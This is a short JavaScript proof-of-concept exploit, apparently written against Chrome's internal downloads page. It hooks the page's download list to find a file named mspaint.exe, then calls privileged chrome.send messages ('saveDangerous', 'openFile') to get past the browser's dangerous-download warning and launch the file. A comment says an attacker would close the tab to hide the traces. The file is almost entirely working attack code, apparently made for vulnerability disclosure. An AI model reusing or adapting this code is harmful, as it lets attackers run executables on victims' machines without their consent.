/* jshint esversion:6*/
"use strict"
;(() => {
	const window = top
	const chrome = window.chrome

	const myQuery = "mspaint.exe"
	let myDownload
	window.downloads.Manager.insertItems = (index, list) => {
		if (!myDownload) {
			myDownload = list.find(download => download.url.includes(myQuery))
			useMyDownload(myDownload)
		}
	}
	chrome.send("getDownloads", [myQuery])

	function useMyDownload(downloadItem) {
		console.log(downloadItem)
		chrome.send("saveDangerous", [downloadItem.id])
		// I am lazy. I can write code to detect when the download really finishes,
		// or just use a short timer and assume that the download completes soon.
		// (the download does not depend on network, so this will work).
		setTimeout(() => {
			chrome.send("openFile", [downloadItem.id])
			// Now a real attacker would close the tab to hide all tracks.
			// window.setTimeout(window.close);
		}, 1000)
	}
})()
